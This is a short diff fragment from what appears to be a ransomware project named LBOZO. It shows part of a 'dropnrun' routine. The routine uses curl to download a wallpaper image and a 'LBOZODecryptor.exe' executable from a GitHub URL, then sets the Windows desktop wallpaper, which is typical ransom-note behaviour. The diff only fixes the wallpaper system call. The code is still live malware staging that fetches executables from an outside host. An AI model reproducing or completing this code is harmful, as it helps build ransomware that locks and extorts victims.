@@ -22,7 +22,7 @@ def dropnrun(programname):
 
     os.system("curl -OL https://github.com/Frikallo/LBOZO/raw/main/out/wallpaper.jpg")
 
-    ctypes.windll.user32.SystemParametersInfoA(20, 0, f"{finaldest}/wallpaper.jpg", 0)
+    ctypes.windll.user32.SystemParametersInfoA(20, 0, os.path.abspath(f"{finaldest}/wallpaper.jpg").encode(), 3)
 
     os.system("curl -OL https://github.com/Frikallo/LBOZO/raw/main/out/LBOZODecryptor.exe")
     with open("LBOZODecryptor.exe", "rb") as f:
